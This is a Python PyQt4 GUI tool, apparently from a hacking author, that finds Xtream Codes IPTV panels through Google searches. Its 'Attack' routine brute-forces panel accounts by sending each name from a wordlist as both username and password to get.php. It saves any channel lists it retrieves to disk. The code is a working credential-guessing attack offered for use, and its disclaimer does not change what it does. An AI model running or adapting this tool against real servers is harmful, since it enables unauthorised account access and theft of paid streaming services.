# -*- coding: utf-8 -*-
#########################################################################
#  This program is free software; you can redistribute it and/or modify #
#  it under the terms of the GNU General Public License as published by #
#  the Free Software Foundation; either version 2 of the License, or    #
#  (at your option) any later version.                                  #
#                                                                       #
#  This program is distributed in the hope that it will be useful,      #
#  but WITHOUT ANY WARRANTY; without even the implied warranty of       #
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        #
#  GNU General Public License for more details.                         #
#                                                                       #
#  You should have received a copy of the GNU General Public License    #
#  along with this program; if not, write to the Free Software          #
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,           #
#  MA 02110-1301, USA.                                                  #
############################# DISCALIMER ################################
#  Usage of this software for probing/attacking targets without prior   #
#  mutual consent, is illegal. It's the end user's responsability to    #
#  obey alla applicable local laws. Developers assume no liability and  #
#  are not responible for any missue or damage caused by thi program    #
#########################################################################

#by Pinperepette - The Pirate

from PyQt4 import QtCore, QtGui
import urllib2
import google
import os
import time
import sys
from urlparse import urlparse
import subprocess
try:
    _fromUtf8 = QtCore.QString.fromUtf8
except AttributeError:
    def _fromUtf8(s):
        return s

try:
    _encoding = QtGui.QApplication.UnicodeUTF8
    def _translate(context, text, disambig):
        return QtGui.QApplication.translate(context, text, disambig, _encoding)
except AttributeError:
    def _translate(context, text, disambig):
        return QtGui.QApplication.translate(context, text, disambig)

#Parameters
search = "Xtream Codes v1.0.59.5"
msg = ""
ll = ""

directory = "output"
names = "names.txt"

#così funziona su mac... sistemare per tutti i sistemi coccodio !!! :P 
def apri():
    subprocess.Popen(['open', "output"])


class Ui_Form(QtGui.QWidget):
    def __init__(self, parent=None):
        QtGui.QWidget.__init__(self, parent)
    def setupUi(self, Form):
        Form.setObjectName(_fromUtf8("Form"))
        Form.resize(609, 321)
        self.gridLayout = QtGui.QGridLayout(Form)
        self.gridLayout.setObjectName(_fromUtf8("gridLayout"))

        self.comboBox = QtGui.QComboBox(Form)
        self.comboBox.setObjectName(_fromUtf8("comboBox"))
        self.link = []
        self.comboBox.addItems(self.link)

        self.gridLayout.addWidget(self.comboBox, 0, 0, 1, 2)
        self.verticalLayout = QtGui.QVBoxLayout()
        self.verticalLayout.setObjectName(_fromUtf8("verticalLayout"))
        spacerItem = QtGui.QSpacerItem(20, 40, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Expanding)
        self.verticalLayout.addItem(spacerItem)

        self.lcdNumber = QtGui.QLCDNumber(Form)
        self.lcdNumber.setObjectName(_fromUtf8("lcdNumber"))

        self.verticalLayout.addWidget(self.lcdNumber)
        spacerItem1 = QtGui.QSpacerItem(20, 40, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Expanding)
        self.verticalLayout.addItem(spacerItem1)

        self.dial = QtGui.QDial(Form)
        self.dial.setObjectName(_fromUtf8("dial"))

        self.verticalLayout.addWidget(self.dial)
        spacerItem2 = QtGui.QSpacerItem(20, 40, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Expanding)
        self.verticalLayout.addItem(spacerItem2)

        self.pushButton_3 = QtGui.QPushButton(Form)
        self.pushButton_3.setObjectName(_fromUtf8("pushButton_3"))
        self.pushButton_3.clicked.connect(self.search_link)

        self.verticalLayout.addWidget(self.pushButton_3)
        spacerItem3 = QtGui.QSpacerItem(20, 40, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Expanding)
        self.verticalLayout.addItem(spacerItem3)

        self.pushButton_2 = QtGui.QPushButton(Form)
        self.pushButton_2.setObjectName(_fromUtf8("pushButton_2"))
        self.connect(self.pushButton_2, QtCore.SIGNAL("released()"), self.action)

        self.verticalLayout.addWidget(self.pushButton_2)
        spacerItem4 = QtGui.QSpacerItem(20, 40, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Expanding)
        self.verticalLayout.addItem(spacerItem4)

        self.pushButton = QtGui.QPushButton(Form)
        self.pushButton.setObjectName(_fromUtf8("pushButton"))
        self.pushButton.clicked.connect(apri)

        self.verticalLayout.addWidget(self.pushButton)
        self.gridLayout.addLayout(self.verticalLayout, 0, 2, 5, 1)
        self.line = QtGui.QFrame(Form)
        self.line.setFrameShape(QtGui.QFrame.HLine)
        self.line.setFrameShadow(QtGui.QFrame.Sunken)
        self.line.setObjectName(_fromUtf8("line"))
        self.gridLayout.addWidget(self.line, 1, 0, 1, 2)
        self.label_2 = QtGui.QLabel(Form)
        self.label_2.setObjectName(_fromUtf8("label_2"))
        self.gridLayout.addWidget(self.label_2, 2, 0, 1, 1)
        self.lineEdit = QtGui.QLineEdit(Form)
        self.lineEdit.setObjectName(_fromUtf8("lineEdit"))
        self.gridLayout.addWidget(self.lineEdit, 2, 1, 1, 1)
        self.line_2 = QtGui.QFrame(Form)
        self.line_2.setFrameShape(QtGui.QFrame.HLine)
        self.line_2.setFrameShadow(QtGui.QFrame.Sunken)
        self.line_2.setObjectName(_fromUtf8("line_2"))
        self.gridLayout.addWidget(self.line_2, 3, 0, 1, 2)

        self.terminal = QtGui.QListWidget(Form)
        self.terminal.setObjectName(_fromUtf8("terminal"))
        self.terminal.setStyleSheet(_fromUtf8("color: rgb(0, 220, 67);\n" "background-color:rgb(4, 4, 4)"))
        self.threadPool = []

        self.gridLayout.addWidget(self.terminal, 4, 0, 1, 2)

        self.retranslateUi(Form)
        QtCore.QObject.connect(self.comboBox, QtCore.SIGNAL(_fromUtf8("currentIndexChanged(QString)")), self.lineEdit.setText)
        QtCore.QObject.connect(self.dial, QtCore.SIGNAL(_fromUtf8("valueChanged(int)")), self.lcdNumber.display)
        QtCore.QMetaObject.connectSlotsByName(Form)

    def retranslateUi(self, Form):
        Form.setWindowTitle(_translate("Form", "IPTV", None))
        self.pushButton_3.setText(_translate("Form", "Search", None))
        self.pushButton_2.setText(_translate("Form", "Attack", None))
        self.pushButton.setText(_translate("Form", "Open", None))
        self.label_2.setText(_translate("Form", "TARGET :", None))

    def search_link(self,text="CoccoDio",iters=6,delay=0.1):
        global ll
        number = int(self.lcdNumber.value())
        for url in google.search(search, num = number, stop = 1):
            parsed = urlparse(url)
            ll = str(parsed.scheme + "://" + parsed.netloc)
            self.link.append( LlThread() )
            self.connect( self.link[len(self.link)-1], QtCore.SIGNAL("update(QString)"), self.add_ll )
            self.link[len(self.link)-1].start()
            time.sleep(delay)


    def add(self, text):
        self.terminal.addItem(text)
        self.terminal.sortItems()

    def add_ll(self, text):
        self.comboBox.addItem(text)

    def segnale(self, delay=0.1):
        self.threadPool.append( MsgThread() )
        self.connect( self.threadPool[len(self.threadPool)-1], QtCore.SIGNAL("update(QString)"), self.add )
        self.threadPool[len(self.threadPool)-1].start()
        time.sleep(delay)

    def Attack(self,text="CoccoDio",iters=6,delay=0.1):
        global msg
        global URL
        URL = str(self.lineEdit.text())
        if URL == "":
            msg = "select a target"
            self.segnale()
        else:
            msg = ("Attack URL:  " + URL )
            self.segnale()
            rows = open(names , "r")
            NR = len(rows.readlines())
            TT = (str(NR))
            n = NR
            msg = ("the list contains " + TT + " elements")
            self.segnale()
            tr = 0
            with open(names) as f:
                content = f.readlines()
                for r in content:
                    req = urllib2.Request( URL + "/get.php?username=%s&password=%s&type=m3u&output=mpegts" % (r.rstrip().lstrip(), r.rstrip().lstrip()))
                    response = urllib2.urlopen(req)
                    the_page = response.read()
                    NR = (NR - 1)
                    TM = (str(NR))
                    msg = ("request number " + TM + " of " + TT + " for name: " + r.rstrip().lstrip())
                    self.segnale()
                    if len(the_page) > 0:
                        tr = (tr + 1)
                        msg = "account found !!! "
                        self.segnale()
                        new_path = directory + "/" + URL.replace("http://", "")
                        if os.path.exists(new_path) is False:
                            os.makedirs(new_path)
                        out_file = open(str(new_path) + "/tv_channels_%s.m3u" % r.rstrip().lstrip(), "w")
                        out_file.write(the_page)
                        out_file.close()
                trov = (str(tr))
                msg = ("Accounts found: " + trov)
                self.segnale()


    def action_ll(self):
        self.link.append( GenericThread(self.Attack,ll,delay=0.1) )
        self.disconnect( self, QtCore.SIGNAL("add(QString)"), self.add_ll )
        self.connect( self, QtCore.SIGNAL("add(QString)"), self.add_ll )
        self.link[len(self.link)-1].start()

    def action(self):
        self.threadPool.append( GenericThread(self.Attack,msg,delay=0.1) )
        self.disconnect( self, QtCore.SIGNAL("add(QString)"), self.add )
        self.connect( self, QtCore.SIGNAL("add(QString)"), self.add )
        self.threadPool[len(self.threadPool)-1].start()

class MsgThread(QtCore.QThread):
    def __init__(self):
        QtCore.QThread.__init__(self)

    def __del__(self):
        self.wait()

    def run(self):
        time.sleep(0.1)
        self.emit( QtCore.SIGNAL('update(QString)'), msg )
        return

class LlThread(QtCore.QThread):
    def __init__(self):
        QtCore.QThread.__init__(self)

    def __del__(self):
        self.wait()

    def run(self):
        time.sleep(0.1)
        self.emit( QtCore.SIGNAL('update(QString)'), ll )
        return

class GenericThread(QtCore.QThread):
    def __init__(self, function, *args, **kwargs):
        QtCore.QThread.__init__(self)
        self.function = function
        self.args = args
        self.kwargs = kwargs

    def __del__(self):
        self.wait()

    def run(self):
        self.function(*self.args,**self.kwargs)
        return

if __name__ == "__main__":
    import sys
    app = QtGui.QApplication(sys.argv)
    Form = QtGui.QWidget()
    ui = Ui_Form()
    ui.setupUi(Form)
    Form.show()
    sys.exit(app.exec_())

